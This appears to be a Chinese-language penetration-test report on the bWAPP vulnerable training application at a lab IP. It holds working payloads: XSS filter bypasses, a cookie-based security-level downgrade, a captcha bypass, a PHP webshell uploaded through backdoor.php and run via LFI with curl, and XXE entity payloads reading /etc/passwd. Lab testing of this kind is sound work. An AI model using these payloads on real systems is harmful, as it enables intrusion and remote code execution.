## 二、安全影响评估

### 🔴 危急
- **open_basedir = no value**：无任何文件系统限制，LFI/目录遍历可读取 /etc/passwd、/etc/shadow、应用源码、日志文件等所有 www-data 可访问文件
- **disable_functions 仅禁用 pcntl_***：exec()、system()、passthru()、shell_exec()、proc_open()、popen() 全部可用。命令注入漏洞 = 直接 RCE。commandi.php、commandi_blind.php、phpi.php 及 /backdoor.php 后门均可利用

### 🟠 高危
- **session.cookie_httponly = Off**：任意 XSS 可直接通过 document.cookie 窃取 PHPSESSID，配合 20+ XSS 练习页面，会话劫持极其容易
- **allow_url_fopen = On**：虽然 allow_url_include=Off 阻止直接 RFI，但 file_get_contents() 等仍可用于 SSRF 攻击

### 🟡 中危
- **expose_php = On**：每个响应头含 X-Powered-By: PHP/5.5.9-1ubuntu4.14，攻击者可直接指纹识别并锁定已知 CVE
- **ereg 扩展已加载**：已弃用的 POSIX 正则扩展，存在空字节注入历史漏洞

### 关键发现

**1. URL编码绕过（最关键发现）**
安全过滤器在 `urldecode()` 之前调用 `htmlspecialchars()`，导致 URL 编码后的 payload（`%3Cscript%3Ealert(1)%3C%2Fscript%3E`）绕过过滤后在浏览器端被解码执行。此方法绕过**全部三个安全等级**，影响 7+ 个端点。

**2. AJAX 架构缺陷**
AJAX 端点采用"前端 encodeURIComponent() 传输 → 后端无输出编码直接返回 HTML → 前端 innerHTML 渲染"的链路。encodeURIComponent 仅用于 URL 传输，后端 PHP 没有任何 XSS 防护，导致**所有安全等级均存在漏洞**。

**3. PHP_SELF 注入（xss_php_self.php）**
攻击者构造 URL 路径 `/%22%3E%3Cscript%3Ealert(1)%3C/script%3E` 即可将恶意代码注入 `<form action="...">` 属性，无需任何用户输入交互。

**4. 存储型 XSS（xss_stored_1.php）**
L0/L1 下博客内容未转义存储，所有访问者均受影响。L2 正确使用 HTML 编码防护。

**5. HTTP 头反射型 XSS**
Referer 和 User-Agent 头被原样反射到页面，L0/L1 原始 payload 触发，L2 使用 URL 编码绕过。

- **PHP配置**: PHP 5.5.9, Apache 2.4.7, session.cookie_httponly=Off, session.cookie_secure=Off

## 发现的漏洞（共7个，5个HIGH级）

### 1. 登出时会话未销毁（CVSS 7.5 HIGH）
- **端点**: ba_logout_1.php
- **描述**: 登出时只清除应用级 Cookie（admin、movie_genre 等），不清除 PHPSESSID 且服务端未调用 session_destroy()。登出后使用旧 PHPSESSID 仍可访问 portal.php（HTTP 200，"Welcome Bee"）。
- **利用**: 攻击者通过 XSS 或网络嗅探获取 PHPSESSID 后，即使合法用户登出，攻击者仍可持久保持会话访问。

### 2. 客户端可控安全等级 Cookie（CVSS 8.2 HIGH）
- **端点**: 所有使用 security_level 的页面
- **描述**: $_COOKIE['security_level'] 优先级高于 $_SESSION['security_level']。服务端 security_level=2（高）可通过修改 Cookie 为 security_level=0（低）完全绕过，所有命令注入、SQLi、XSS 防御全部失效。
- **验证**: 服务端设置 security_level=2 → Cookie 改为 0 → commandi.php 仍可执行 `whoami` 返回 www-data。

### 3. 验证码完全可绕过（CVSS 7.5 HIGH）
- **端点**: ba_captcha_bypass.php
- **描述**: captcha.php 不生成验证码图片（HTTP 302 空重定向），$_SESSION['captcha'] 为空。提交空 captcha_user= 即通过验证。
- **验证**: POST login=bee&password=bug&captcha_user=&form=submit → "Successful login!"

### 4. /admin/ 目录无认证保护（CVSS 8.6 HIGH）
- **端点**: /admin/ 和 /admin/index.php
- **描述**: 无需任何 Cookie 或会话即可直接访问完整管理后台。无 .htaccess 保护，无会话检查。
- **验证**: `curl http://192.168.230.128/admin/` → HTTP 200，完整管理后台页面。

### 5. 无暴力破解保护（CVSS 7.5 HIGH）
- **端点**: /login.php
- **描述**: 10 次快速错误登录全部以 ~3ms 响应时间处理，无速率限制、无账户锁定、无验证码触发、无延迟递增。
- **验证**: 循环 10 次 POST bee/wrongpass → 全部 HTTP 200，响应时间一致。

### 6. Cookie 安全标志缺失（CVSS 5.3 MEDIUM）
- **PHPSESSID**: 仅含 path=/，缺少 HttpOnly、Secure、SameSite
- **security_level**: 含 path=/ + Expires + Max-Age（1年），缺少 HttpOnly、Secure、SameSite
- **影响**: HttpOnly 缺失使 XSS 可窃取会话；Secure 缺失允许明文传输嗅探；1年 security_level 有效期使降级攻击持久化。

### 7. 弱密码接受（CVSS 6.5 MEDIUM）
- **端点**: ba_weak_pwd.php
- **描述**: 接受 test/test 极弱凭据，无密码复杂度要求。

## 一、backdoor.php（NSA 后门）— CVSS 9.8 危急

### 源码关键发现
- 参数：`file`（上传文件）、`uploadDir`（目标路径）、`upload`（提交按钮）
- **无任何安全等级检查**：不包含 security.php，不包含 security_level_check.php，不包含 functions_external.php
- **无需认证**：无会话检查，无登录验证
- 使用 `move_uploaded_file()` 后执行 `chmod($dir."/".$file, 0755)`

### 利用结果

| 目标路径 | 上传结果 | 原因 |
|---------|---------|------|
| `/var/www/bWAPP/images/` | ❌ 无法写入 | root:root，drwxr-xr-x |
| `/var/www/html/` | ❌ 无法写入 | root:root，drwxr-xr-x |
| `/tmp/` | ✅ 成功写入 | www-data 可写 |

### 完整 RCE 链（已验证）

**步骤1 — 上传 webshell 至 /tmp/：**
```bash
echo '<?php echo "RCE_OK:"; system($_GET["c"]." 2>&1"); ?>' > /tmp/upload_shell.php

curl -s -b "PHPSESSID=hqp6ep98dvmqtp6uerl7jd6kt5; security_level=0" \
  -F "file=@/tmp/upload_shell.php" -F "uploadDir=/tmp/" -F "upload=Upload" \
  http://192.168.230.128/bWAPP/backdoor.php
# 响应: "File uploaded"
```

**步骤2 — 通过 rlfi.php LFI 链执行命令：**
```bash
curl -s -b "PHPSESSID=hqp6ep98dvmqtp6uerl7jd6kt5; security_level=0" \
  "http://192.168.230.128/bWAPP/rlfi.php?language=/tmp/upload_shell.php&c=id"
# 输出: RCE_OK:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 安全等级影响
backdoor.php 本身**完全不受安全等级影响**。但 LFI 链中的 rlfi.php 受安全等级限制：
- **L0**：直接 include → ✅ 可利用
- **L1**：追加 .php 后缀 → ❌ 阻断（`/tmp/upload_shell.php.php` 不存在）
- **L2**：白名单限制 → ❌ 阻断

由于 security_level 通过 Cookie 客户端可控，攻击者仅需设置 `security_level=0` 即可启用完整 RCE 链。

## 二、XXE XML 外部实体注入 — 部分可利用

### 二-A、内部实体注入 ✅ 确认（中危 CVSS 5.3）

| 属性 | 值 |
|------|-----|
| 端点 | xxe-2.php（POST XML，由 xxe-1.php 的 JS 表单提交） |
| 认证 | **无需认证！** |
| 安全等级影响 | 无（libxml2 层面保护，非应用层） |

**成功 Payload：**
```xml
<!DOCTYPE foo [<!ENTITY internal "ENTITY_WORKS">]>
<reset><login>&internal;</login><secret>test123</secret></reset>
```
响应：`"ENTITY_WORKS's secret has been reset!"` — 成功将用户 "ENTITY_WORKS" 的 secret 重置。

**影响：** 攻击者可通过 XML 实体注入重置任意用户的 secret（login 字段为实体值）。组合 IDOR 可实现跨用户操作。

### 二-B、外部实体注入 ❌ 被阻止

所有外部实体 payload 均返回 `"An error occured!"`：
- `SYSTEM "file:///etc/passwd"` → ❌
- `SYSTEM "php://filter/convert.base64-encode/resource=/app/config.inc"` → ❌
- `SYSTEM "file:///etc/hostname"` → ❌
